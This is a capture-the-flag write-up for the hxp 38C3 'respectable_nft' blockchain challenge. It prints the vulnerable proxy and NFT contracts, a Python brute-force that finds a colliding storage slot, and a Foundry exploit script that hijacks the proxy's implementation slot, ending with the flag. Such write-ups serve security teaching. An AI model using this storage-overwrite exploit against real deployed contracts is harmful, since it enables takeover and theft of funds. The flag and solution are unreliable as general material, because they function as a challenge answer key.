---
title: Blockchain - respectable_nft
description: 2024 | hxp 38C3 CTF | MSC
tags:
    - smart contract
    - solidity
    - storage layout
    - brute force
---

## Description

My favorite TikTok influencer told me about a great NFT project that is guaranteed to not be a scam. It even has this cool feature where you can name your token :^)

??? note "Setup.sol"

    ```js
    //SPDX-License-Identifier: Unlicense
    pragma solidity 0.8.20;

    import "./UpgradeableProxy.sol";
    import "./CryptoFlags.sol";

    contract Setup {
        CryptoFlags public cryptoFlags;

        constructor() payable {
            UpgradeableProxy proxy = new UpgradeableProxy();
            CryptoFlags impl = new CryptoFlags();
            proxy.upgradeTo(address(impl));
            cryptoFlags = CryptoFlags(address(proxy));
        }

        function isSolved() public view returns (bool) {
            return cryptoFlags.isSolved();
        }
    }
    ```

??? note "UpgradeableProxy.sol"

    ```js
    //SPDX-License-Identifier: Unlicense
    pragma solidity 0.8.20;

    contract UpgradeableProxy {
        // keccak256("owner_storage");
        bytes32 public constant OWNER_STORAGE = 0x6ec82d6c1818e9fe1ca828d3577e9b2dadd8d4720dd58701606af804c069cfcb;
        // keccak256("implementation_storage");
        bytes32 public constant IMPLEMENTATION_STORAGE = 0xb6753470eb6d4b1c922b6fc73d6f139c74e8cf70d68951794272d43bed766bd6;

        struct AddressSlot {
            address value;
        }

        function getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
            assembly {
                r.slot := slot
            }
        }

        constructor() {
            AddressSlot storage owner = getAddressSlot(OWNER_STORAGE);
            owner.value = msg.sender;
        }

        function upgradeTo(address implementation) external {
            require(msg.sender == getAddressSlot(OWNER_STORAGE).value, "Only owner can upgrade");
            getAddressSlot(IMPLEMENTATION_STORAGE).value = implementation;
        }

        function _delegate(address implementation) internal {
            assembly {
                // Copy msg.data. We take full control of memory in this inline assembly
                // block because it will not return to Solidity code. We overwrite the
                // Solidity scratch pad at memory position 0.
                calldatacopy(0, 0, calldatasize())

                // Call the implementation.
                // out and outsize are 0 because we don't know the size yet.
                let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)

                // Copy the returned data.
                returndatacopy(0, 0, returndatasize())

                switch result
                // delegatecall returns 0 on error.
                case 0 {
                    revert(0, returndatasize())
                }
                default {
                    return(0, returndatasize())
                }
            }
        }

        fallback() external payable {
            _delegate(getAddressSlot(IMPLEMENTATION_STORAGE).value);
        }
    }
    ```

??? note "CryptoFlags.sol"

    ```js
    //SPDX-License-Identifier: Unlicense
    pragma solidity 0.8.20;

    import "./ERC721_flattened.sol";

    contract CryptoFlags is ERC721 {
        mapping(uint256 => string) public FlagNames;
        constructor()
            ERC721("CryptoFlags", "CTF")
        {
        }

        function _beforeTokenTransfer(
            address from,
            address to,
            uint256 tokenId
        ) internal override virtual {
            require(from == address(0), "no flag sharing pls :^)");
            to; tokenId;
        }

        function setFlagName(uint256 id, string memory name) external {
            require(ownerOf(id) == msg.sender, "Only owner can name the flag");
            require(bytes(FlagNames[id]).length == 0, "that flag already has a name");
            FlagNames[id] = name;
        }

        function claimFlag(uint256 id) external {
            require(id <= 100_000_000, "Only the first 100_000_000 ids allowed");
            _mint(msg.sender, id);
        }

        function isSolved() external pure returns (bool) {
            return false;
        }
    }
    ```

## Solution

- The CryptoFlags is using a proxy, to make `isSolved()` return true, we have to update the value stored in the implementation slot, since the current logic contract will always return false.
- There are two possible ways to upgrade the contract, both of which require modifying specific slots in an unauthorized manner:
    - Directly modify the `IMPLEMENTATION_STORAGE` slot
    - Modify the `OWNER_STORAGE` slot, then call `upgradeTo()` to modify the `IMPLEMENTATION_STORAGE` slot
- Since mapping `FlagNames` occupies slot 6, through the `setFlagName()` function in the CryptoFlags contract, we can modify the storage slot at `keccak(abi.encode(id, 6))` or after `keccak(uint256(keccak(abi.encode(id, 6))))`, depending on the length of the string.

    ```js
    function setFlagName(uint256 id, string memory name) external {
        require(ownerOf(id) == msg.sender, "Only owner can name the flag");
        require(bytes(FlagNames[id]).length == 0, "that flag already has a name");
        FlagNames[id] = name;
    }

    function claimFlag(uint256 id) external {
        require(id <= 100_000_000, "Only the first 100_000_000 ids allowed");
        _mint(msg.sender, id);
    }
    ```

- If the target slot is at `keccak(abi.encode(id, 6))`, we can not modify it because `bytes(FlagNames[id]).length` is not zero, and it is impossible to find such a collision. But it is possible that the target slot is close to `keccak(uint256(keccak(abi.encode(id, 6))))`. Luckily, CryptoFlags limits the maximum value of `id`, we can traverse within this range.

    ```py
    from web3 import Web3
    from tqdm import tqdm

    owner_slot = int("6ec82d6c1818e9fe1ca828d3577e9b2dadd8d4720dd58701606af804c069cfcb", 16)
    impl_slot = int("b6753470eb6d4b1c922b6fc73d6f139c74e8cf70d68951794272d43bed766bd6", 16)

    for i in tqdm(range(100_000_001)):
        h = Web3.solidity_keccak(['uint256', 'uint256'], [i, 6])
        slot = int(Web3.solidity_keccak(['uint256'], [int(h.hex(), 16)]).hex(), 16)
        d = owner_slot - slot
        # the slot where `name` stored should not be too far from the target slot
        # to avoid reaching the block gas limit
        if d >= 0 and d <= 10000:
            print(i, h.hex(), hex(slot), d)
        d = impl_slot - slot
        if d >= 0 and d <= 10000:
            print(i, h.hex(), hex(slot), d)

    # Result: 56488061 fd873ebcc46cb76d491c36d05ef9b7b40d72903b955f8c3cc3bfceab0b7eccb7 0xb6753470eb6d4b1c922b6fc73d6f139c74e8cf70d68951794272d43bed766b49 141
    ```

- The result shows that there is one slot that is only 141 slots away from the `IMPLEMENTATION_STORAGE` slot. Thus, we can directly modify it and solve the challenge <3

??? note "Solve.s.sol"

    ```js
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity ^0.8.13;

    import {Script, console} from "forge-std/Script.sol";
    import "src/Setup.sol";

    contract Solved {
        function isSolved() external pure returns (bool) {
            return true;
        }
    }

    contract SolveScript is Script {
        function run() public virtual {
            Setup setup = Setup(vm.envAddress("SETUP"));
            CryptoFlags cryptoFlags = setup.cryptoFlags();
            uint256 id = 56488061;
            vm.startBroadcast(vm.envUint("PRIV"));
            cryptoFlags.claimFlag(id);
            cryptoFlags.setFlagName(id, string(abi.encodePacked(
                new bytes(141 * 32),
                abi.encode(address(new Solved()))
            )));
            vm.stopBroadcast();

            require(setup.isSolved(), "did not solve :'(");
        }
    }
    ```

### Flag

> hxp{n3v3r_7ru57_pr3c0mpu73d_v4lu35}
